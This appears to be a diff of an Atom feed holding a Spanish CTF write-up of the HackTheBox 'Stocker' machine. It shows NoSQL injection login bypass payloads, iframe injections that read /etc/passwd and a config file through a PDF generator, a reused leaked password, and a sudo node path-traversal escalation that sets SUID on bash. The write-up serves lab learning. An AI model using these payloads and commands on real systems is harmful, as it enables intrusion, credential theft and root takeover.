-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:             http://stocker.htb
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:          GET
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:         100
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:      gobuster/3.5
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:         10s
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-2023/03/12 22:15:04 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;VHOST enumeration mode
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-Found: dev.stocker.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 28]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Encontramos un subdominio, ahora es tan solo agregarlo al /etc/hosts&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;10.10.11.196 dev.stocker.htb&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/hosts
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Ingresemos a la web&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/pag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Podemos ver que tenemos un login, intenté bypasear el login comprobando si es vulnerable a los ataques sqli pero no tuve resultados, después de muchos intentos con BurpSuite me di cuenta que puedo cambiar las peticiones para causar ataques NoSqli&lt;/p&gt;
-
-&lt;p&gt;Al interceptar por BurpSuite nos muestra esto&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-POST /login HTTP/1.1
-
-Host: dev.stocker.htb
-
-User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;X11&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Linux x86_64&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rv:102.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Gecko/20100101 Firefox/102.0
-
-Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,image/avif,image/webp,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8
-
-Accept-Language: en-US,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.5
-
-Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
-
-Content-Type: application/x-www-form-urlencoded
-
-Content-Length: 29
-
-Origin: http://dev.stocker.htb
-
-Connection: close
-
-Referer: http://dev.stocker.htb/login
-
-Cookie: connect.sid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s%3AeehRhX_wEYQcXzjWxltuGkOJ0T8tYaa_.iO7JxTfBZdxcPOUdjeU3uGBLRc9P4jRifl0bGfz0Jx8
-
-Upgrade-Insecure-Requests: 1
-
-
-&lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin&amp;amp;password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora para hacer el ataque NoSqli tenemos que ejecutar donde está el apartado username=admin…. con este script&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ne&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;: null&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ne&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;: null&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Pero antes donde dice content-Type tenemos que poner esto&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;application/json
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Y nos quedaría algo así&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/burp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Finalmente le damos un FORWARD&lt;/p&gt;
-
-&lt;p&gt;Miremos la web&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/pagina2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al darle view cart nos muesta esto, es como si fuera una tienda y podemos agregar cosas al carrito para comprar&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/compras.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Agregamos algo al carrito y le damos View Cart nos muestra esto&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/compras2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Le damos a submit y nos muestra como un identificador y un enlace en HERE&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/compras3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si le damos a HERE nos redirige a /api/po/ y al identificador que nos termina mostrando un pdf&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/pdf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Volvemos a interceptar con Burp y le damos submit&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/submit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos una estructura en json&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/json.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En el apartado title podemos modificar  y pasarle una estructura que tenga un archivo un ejemplo es el /etc/passwd&lt;/p&gt;
-
-&lt;h2 id=&quot;codigo&quot;&gt;Codigo&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;file:///etc/passwd &lt;span class=&quot;nv&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;750px &lt;span class=&quot;nv&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;750px&amp;gt;&amp;lt;/iframe&amp;gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Miramos en el repeater que a la derecha luego de ejecutar el código nos muestra una id&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/id.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Copiamos ese id y lo pegamos donde está el pdf para que nos muestre el /etc/passwd&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/pdf2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si prestamos atención al archivo podemos ver que hay un usuario que se llama angoose&lt;/p&gt;
-
-&lt;p&gt;Puedo pensar que al tener un subdominio llamado dev tengo entendido que /var/www/dev/index.js sea un archivo de configuración válido&lt;/p&gt;
-
-&lt;p&gt;Si ejecutamos este script, copiamos el id y lo pegamos donde está el pdf&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-Bash&quot;&gt;&quot;&amp;lt;iframe src=file:///var/www/dev/index.js height=800px width=800px&amp;gt;&amp;lt;/iframe&amp;gt;&quot;
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Deberíamos ver el index.js en el pdf claramente&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/burpsuite.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/id2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Donde marqué, podemos ver que el archivo se conecta a mongodb que tiene una contraseña, podemos probar esa contraseña para poder conectarnos 
-con ssh con el usuario angoose&lt;/p&gt;
-
-&lt;p&gt;Nos conectamos por ssh&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-❯ ssh angoose@10.10.11.196
-The authenticity of host &lt;span class=&quot;s1&quot;&gt;&apos;10.10.11.196 (10.10.11.196)&apos;&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;&apos;t be established.
-ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added &apos;&lt;/span&gt;10.10.11.196&lt;span class=&quot;s1&quot;&gt;&apos; (ED25519) to the list of known hosts.
-angoose@10.10.11.196&apos;&lt;/span&gt;s password: IHeardPassphrasesArePrettySecure 
-Last login: Sun Mar 12 23:53:34 2023 from 10.10.16.39
-angoose@stocker:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ifconfig
-eth0: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
-        inet 10.10.11.196  netmask 255.255.254.0  broadcast 10.10.11.255
-        ether 00:50:56:b9:d8:2d  txqueuelen 1000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        RX packets 585090  bytes 75834889 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;75.8 MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 592998  bytes 176522802 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;176.5 MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-lo: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;73&amp;lt;UP,LOOPBACK,RUNNING&amp;gt;  mtu 65536
-        inet 127.0.0.1  netmask 255.0.0.0
-        loop  txqueuelen 1000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local Loopback&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        RX packets 23722  bytes 4015190 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.0 MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 23722  bytes 4015190 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.0 MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-angoose@stocker:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Hacemos ls y ya podemos ver la primera flag&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;flag.js  user.txt
-angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
-ca4&lt;span class=&quot;k&quot;&gt;*************************&lt;/span&gt;7d
-angoose@stocker:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;escala-de-privilegios&quot;&gt;Escala de privilegios&lt;/h2&gt;
-
-&lt;p&gt;Si hacemos sudo -l vemos que podemos ejecutar cualquier js con node&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;angoose: IHeardPassphrasesArePrettySecure 
-Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;angoose on stocker:
-    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
-
-User angoose may run the following commands on stocker:
-    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; /usr/bin/node /usr/local/scripts/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.js
-angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora definimos un js para que nos haga una bash suid, cuando lo ejecutemos nos hará un directory path traversal&lt;/p&gt;
-
-&lt;h2 id=&quot;codigo-js&quot;&gt;Codigo js&lt;/h2&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;require(&apos;child_process&apos;).exec(&apos;chmod u+s /bin/bash&apos;)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Ejecutamos el script de js y al hacer bash -p tendremos privilegio como root&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;node /usr/local/scripts/../../../home/angoose/setensa.js
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;angoose: IHeardPassphrasesArePrettySecure 
-angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /bin/bash
-&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 1183448 Apr 18  2022 /bin/bash
-angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
-bash-5.0# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
-bash-5.0# &lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;root.txt
-bash-5.0# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
-26&lt;span class=&quot;k&quot;&gt;*****************************&lt;/span&gt;9
-bash-5.0# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Y obtenemos la segunda flag&lt;/p&gt;
-
-&lt;p&gt;Espero que les haya gustado mi primer writeup y que se haya entendido&lt;/p&gt;
-
-&lt;p&gt;Gracias por leer :D.&lt;/p&gt;</content><author><name>VØ1DN3T</name></author><category term="hackthebox" /><category term="pentesting" /><category term="Hacking web" /><category term="pentesting" /><category term="Linux" /><summary type="html">Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox la cual está catalogada como easy, espero que disfruten del contenido.</summary></entry></feed>
+&lt;p&gt;Gracias por leer :D.&lt;/p&gt;</content><author><name>Vo1dN3t</name></author><category term="hackthebox" /><category term="pentesting" /><category term="Active Directory" /><category term="pentesting" /><category term="windows" /><category term="Remote port Forwarding" /><summary type="html">Buenas a todos, en esta ocasión resolveremos una máquina windows llamada flight lo cual está catalogada como hard en la plataforma de HackTheBox, me costó bastante resolver esta máquina más que nada la escalada de privilegios, disfruten el contendido.</summary></entry></feed>
